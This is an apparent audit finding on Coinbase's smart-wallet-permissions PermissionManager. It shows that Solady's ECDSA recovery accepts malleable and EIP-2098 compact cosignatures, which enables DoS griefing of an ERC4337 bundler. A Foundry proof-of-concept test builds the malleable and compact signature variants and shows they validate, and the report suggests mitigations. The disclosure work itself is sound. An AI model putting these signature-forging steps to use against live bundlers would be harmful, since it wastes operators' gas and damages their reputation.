#### Summary

The PermissionManager's validation schema for permissioned UserOperations improperly handles ECDSA signature recovery for `cosignatures`, which are signatures of the PermissionedUserOp by an admin key/address managed by Coinbase called the `cosigner`. Signatures issued by Coinbase's `PermissionManager::cosigner` private key are vulnerable to both signature malleability and EIP2098 compact signature replay because recovery is performed in a way that does not disallow ECDSA signature malleability nor for EIP2098 compact signatures. This stems from the `Solady::ECDSA` library used to perform the recovery which, in contrast to the common alternative `OpenZeppelin::ECDSA` library, does not throw an error for malleable or unexpected EIP2098 compact signatures.

It is important to note that this handling of ECDSA signatures within the `smart-wallet-permissions::PermissionManager`'s special permissioning system added to standard ERC4337 UserOperations does not result in the usual outcome of signature replay- that is to say replayability of UserOperations- except in one extremely unlikely case\*\* (noted at the bottom of this report). Replayability generally cannot be achieved because the `ERC4337::Entrypoint`'s nonce management system disallows execution of UserOperations with duplicate nonces by reverting them. This revert behavior gives rise to another attack vector however: DOS grief attacks on the bundler.

Due to the PermissionManager's improper handling of `Solady::ECDSA::recover()`, PermissionedUserOps submitted to the project's bundler with malleable or compact signatures will pass the ERC4337 simulation steps and pass the ERC4337 `IAccount::validateUserOp()` validation step of the standard's pre-execution steps. As a result, an attacker can achieve DOS of all bundles submitted to the bundler by:

- 1. monitoring valid PermissionedUserOps in the public ERC4337 mempool,
- 2. constructing malleable/compact signatures for them, and
- 3. resubmitting malicious copies containing malleable and/or compact signatures.
     The bundler will then revert when attempting to settle them in the ERC4337 execution phase, manifesting a griefing vector that damages the bundler's reputation in the ERC4337 reputation system and spends gas associated with the reverts.

#### Vulnerability Details

The vulnerability lies in the call to `Solady::ECDSA.recover()` in line 354 of `PermissionManager::isValidSignature()`, which is used to validate permissioned UserOperations.

`    // parse cosigner from cosignature
    address userOpCosigner = ECDSA.recover(userOpHash, data.userOpCosignature);`

Malleability and compact formatting of signatures are referenced in the Solady documentation here: https://github.com/Vectorized/solady/blob/4363564a984779b7eec3bff00ab1de3a9db4e2d5/src/utils/ECDSA.sol#L21

Relevant lines:
`/// WARNING! Do NOT directly use signatures as unique identifiers:
/// - The recovery operations do NOT check if a signature is non-malleable.`
`/// - As of Solady version 0.0.134, all `bytes signature`variants accept both
///   regular 65-byte`(r, s, v)`and EIP-2098`(r, vs)`short form signatures.
///   See: https://eips.ethereum.org/EIPS/eip-2098`

##### Overview:

1. **Signature Variability**: For each valid ERC4337 PermissionedUserOp, there exist two additional valid PermissionedUserOps due to malleable and compact ECDSA signatures.
2. **Simulation and Validation Bypass**: These additional signatures can pass the ERC4337 simulation steps and `IAccount::validateUserOp()` validation step.
3. **DoS Attack Vector**: An attacker can submit malleable/compact signatures for valid PermissionedUserOps to the public ERC4337 mempool. This results in the bundler attempting to settle these operations, only to revert during execution due to nonce duplication. The reverts consume gas and harm the bundler's reputation within the ERC4337 reputation system.
4. **Resource Exhaustion**: The gas consumed by these reverts can lead to resource exhaustion and disruption of normal operations.

#### Steps to Reproduce

To demonstrate the issue, the following Proof of Concept (PoC) code was developed. This code tests the validation of malleable and compact signatures on the PermissionManager.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {PermissionCallable} from "src/mixins/PermissionCallable.sol";
import {MockCoinbaseSmartWallet} from "./mocks/MockCoinbaseSmartWallet.sol";
import {ERC4337, MockERC4337} from "solady/../test/utils/mocks/MockERC4337.sol";
import {PermissionManager} from "../src/PermissionManager.sol";
import {MockPermissionContract} from "./mocks/MockPermissionContract.sol";
import {UserOperation, UserOperationLib} from "src/utils/UserOperationLib.sol";
import {CoinbaseSmartWallet} from "smart-wallet/CoinbaseSmartWallet.sol";
import {MockEntryPoint} from "smart-wallet/../test/mocks/MockEntryPoint.sol";
import {ECDSA} from "solady/utils/ECDSA.sol";
import {EntrypointRuntimeBytecode} from "./EntrypointRuntimeBytecode.sol";

contract Findings is Test, EntrypointRuntimeBytecode {
    PermissionManager permissionManager;
    uint256 ownerPk = uint256(keccak256("owner"));
    address owner = vm.addr(ownerPk);
    uint256 cosignerPk = uint256(keccak256("cosigner"));
    address cosigner = vm.addr(cosignerPk);
    uint256 permmissionSignerPk = uint256(keccak256("permissionSigner"));
    address permissionSigner = vm.addr(permmissionSignerPk);
    address entrypoint = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
    MockCoinbaseSmartWallet account;
    MockPermissionContract successPermissionContract;
    MockPermissionContract failPermissionContract;

    function test_malleableCosignatureReplay() public {
        _etchEntrypoint();
        _initializePermissionManager();

        PermissionManager.Permission memory permission = _createPermission();

        bytes32 permissionHash = permissionManager.hashPermission(permission);
        bytes32 replaySafeHash = account.replaySafeHash(permissionHash);

        // user approves a permission
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = account.wrapSignature(0, ownerSig);
        permission.approval = approval;

        UserOperation memory userOp = _createUserOp(permission);
        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        // `entryPoint.getUserOpHash(userOp)`
        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
        bytes32 userOpHash = bytes32(ret);

        bytes memory uoSig = _getSignature(userOpHash, permmissionSignerPk);
        permissionedUserOp.userOpSignature = uoSig;

        (uint8 cosigV, bytes32 cosigR, bytes32 cosigS) = vm.sign(cosignerPk, userOpHash);
        bytes memory uoCosig = abi.encodePacked(cosigR, cosigS, cosigV);

        permissionedUserOp.userOpCosignature = uoCosig;

        // `EIP1271::isValidSignature()` is called within `IAccount::validateUserOp()` in ERC4337 simulation/validation
        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass

        bytes memory malUoCoSig = _constructMalleableSignatureComplement(cosigR, cosigS, cosigV);
        // both signatures recover to the cosigner despite one being derived from the other without knowing `cosignerPk`
        _proveMalleability(userOpHash, uoCosig, malUoCoSig);

        permissionedUserOp.userOpCosignature = malUoCoSig; // call `isValidSignature()` again w/ constructed malleable sig
        bytes4 magicValueFromMalleableCosignature = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        assertEq(magicValueFromMalleableCosignature, canonicalEIP1271Val);
    }

    function _constructMalleableSignatureComplement(bytes32 cosigR, bytes32 cosigS, uint8 cosigV) internal returns (bytes memory) {
        uint256 SECP256KN = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        uint256 sComplement = SECP256KN - uint256(cosigS);
        uint8 yParityFlipped = cosigV == 0x1b ? 0x1c : 0x1b;
        return abi.encodePacked(cosigR, sComplement, yParityFlipped);
    }

    function test_compactCosignatureReplay() public {
        _etchEntrypoint();
        _initializePermissionManager();

        PermissionManager.Permission memory permission = _createPermission();
        bytes32 permissionHash = permissionManager.hashPermission(permission);
        bytes32 replaySafeHash = account.replaySafeHash(permissionHash);

        // user approves a permission
        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
        bytes memory approval = account.wrapSignature(0, ownerSig);
        permission.approval = approval;

        UserOperation memory userOp = _createUserOp(permission);
        PermissionManager.PermissionedUserOperation memory permissionedUserOp;
        permissionedUserOp.userOp = userOp;
        permissionedUserOp.permission = permission;

        // `entryPoint.getUserOpHash(userOp)`
        (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
        bytes32 userOpHash = bytes32(ret);

        bytes memory uoSig = _getSignature(userOpHash, permmissionSignerPk);
        permissionedUserOp.userOpSignature = uoSig;

        (uint8 cosigV, bytes32 cosigR, bytes32 cosigS) = vm.sign(cosignerPk, userOpHash);
        bytes memory uoCosig = abi.encodePacked(cosigR, cosigS, cosigV);

        permissionedUserOp.userOpCosignature = uoCosig;

        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass

        bytes memory malUoCoSig = _constructEIP2098CompactSignature(cosigR, cosigS, cosigV);
        // both signatures recover to the cosigner despite one being derived from the other without knowing `cosignerPk`
        _proveMalleability(userOpHash, uoCosig, malUoCoSig);

        permissionedUserOp.userOpCosignature = malUoCoSig; // call `isValidSignature()` again w/ constructed malleable sig
        bytes4 magicValueFromMalleableCosignature = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
        assertEq(magicValueFromMalleableCosignature, canonicalEIP1271Val);
    }

    function _constructEIP2098CompactSignature(bytes32 cosigR, bytes32 cosigS, uint8 cosigV) internal returns (bytes memory) {
        // hijack top bit of `cosigS` to encode `yParity` into a compact 64-byte signature
        uint256 yParity = cosigV - 0x1b;
        bytes32 sEncodedYParity = cosigS | bytes32(yParity << 255);
        return abi.encodePacked(cosigR, sEncodedYParity);
    }

    function _proveMalleability(bytes32 digest, bytes memory originalSig, bytes memory malleableSig) internal {
        address originalRec = ECDSA.recover(digest, originalSig);
        address malRec = ECDSA.recover(digest, malleableSig);
        assertEq(malRec, cosigner);
        assertEq(originalRec, malRec);
    }

    function _initializePermissionManager() internal {
        permissionManager = new PermissionManager(owner, cosigner);
        account = new MockCoinbaseSmartWallet();
        bytes[] memory owners = new bytes[](1);
        owners[0] = abi.encode(owner);
        account.initialize(owners);
        successPermissionContract = new MockPermissionContract(false);
        failPermissionContract = new MockPermissionContract(true);
        vm.prank(owner);
        permissionManager.setPaymasterEnabled(address(0x42), true);
    }

    function _createPermission() internal returns (PermissionManager.Permission memory) {
        return PermissionManager.Permission({
            account: address(account),
            chainId: block.chainid,
            expiry: type(uint48).max,
            signer: abi.encode(permissionSigner),
            permissionContract: address(successPermissionContract),
            permissionValues: hex"",
            verifyingContract: address(permissionManager),
            approval: hex""
        });
    }

    function _createUserOp(PermissionManager.Permission memory permission) internal returns (UserOperation memory) {
        UserOperation memory userOp;

        userOp.sender = address(account);
        userOp.nonce = 4337;
        address paymaster = address(0x42);
        userOp.paymasterAndData = abi.encodePacked(paymaster);

        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](1);
        bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
        calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);

        userOp.callData = abi.encodeWithSelector(
            CoinbaseSmartWallet.executeBatch.selector,
            calls
        );

        return userOp;
    }

    function _getSignature(bytes32 digest, uint256 privateKey) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function _etchEntrypoint() internal {
        vm.etch(entrypoint, ENTRYPOINT_RUNTIME_BYTECODE);
    }
}
```

#### Suggested Mitigation

To mitigate this issue, it is recommended to handle and reject malleable and compact cosignatures within the schema's recovery process. Specifically:

1. **Malleability Check**: Verify that the `s` value of the ECDSA signature is in the lower half of the curve order to avoid malleability.
2. **Compact Signature Handling**: Recognize and correctly process EIP2098 compact signatures to ensure they are treated equivalently to standard signatures in terms of validation.

By implementing these checks, the system can prevent the misuse of malleable and compact signatures, thereby securing the integrity of the permissioning system and preventing potential DoS attacks. These checks also provide a guarantee of forward-security given that different ECDSA libraries offer varying behaviors with regard to signature recovery and upgrading/downgrading or swapping out dependencies could lead to this bug being reintroduced in the future.

#### Non-standard UserOperation struct encoding edge case

\*\*The replayability of malleable and compact cosignatures can in theory be used to replay UserOperations in one edge case only: when UserOperations are constructed using non-standard struct encoding which leads the v0.6 Entrypoint's canonical `userOpHash` to not include the UserOperation's nonce. In this case, UserOperations can be crafted, signed, and submitted with any nonce in which case the cosignature replayability can be used to replay two additional UserOperations with new cosignatures derived from the original: one with a malleable signature and one with an EIP2098 compact signature. However, this edge case is exceedingly unlikely (application must use non-standard UserOperation struct encoding), is almost invariably undesirable (non-standard struct must still be signed by smart-wallet owners), and is the result of a known issue in the v0.6 Entrypoint implementation's `pack()` function. More info here: https://github.com/eth-infinitism/account-abstraction/issues/237#issuecomment-1466686252
